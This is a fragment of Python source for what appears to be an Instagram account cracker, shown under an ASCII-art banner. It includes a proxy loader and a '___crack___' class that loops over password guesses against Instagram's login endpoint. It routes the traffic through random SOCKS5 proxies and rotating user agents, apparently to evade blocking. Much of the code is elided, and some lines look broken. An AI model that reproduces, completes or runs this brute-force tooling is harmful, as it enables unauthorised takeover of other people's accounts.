...
{A}║  {O}╚═╝{H}╚═╝  ╚═══╝{K}╚══════╝   {P}╚═╝   {M}╚═╝  ╚═╝       {J}╚═════╝{U}╚═╝  ╚═╝{H}╚═╝  ╚═╝ {O}╚═════╝{K}╚═╝  ╚═╝  {A}║
{A}║                                                                                        {A}║
{A}║                                                                {A}VERSION{P}: {H}UNLIMITED{A}-{O}001  {A}║
{A}║                                                                                        {A}║
{A}╚════════════════════════════════════════════════════════════════════════════════════════╝
...
def ___proxy___():
    try:
        ...
        open('Data/proxy3.txt', 'w').write(___roz)
    except Exception as e:
...
class ___crack___:
    ...
    def __main__(self, user, uid, pwx):
        try:
            ...
            ___roz = requests.get(open('Data/ua2.txt','r').read().splitlines())   
        try:
            for pw in pwx:
                pw = pw.lower()
                ___url = ('https://z-p42.www.instagram.com/')
                ___login = ('https://z-p42.www.instagram.com/accounts/login/ajax/')
                ___proxy = {'http': 'socks5://%s'%(random.choice(open("Data/proxy3.txt","r").read().splitlines()))}
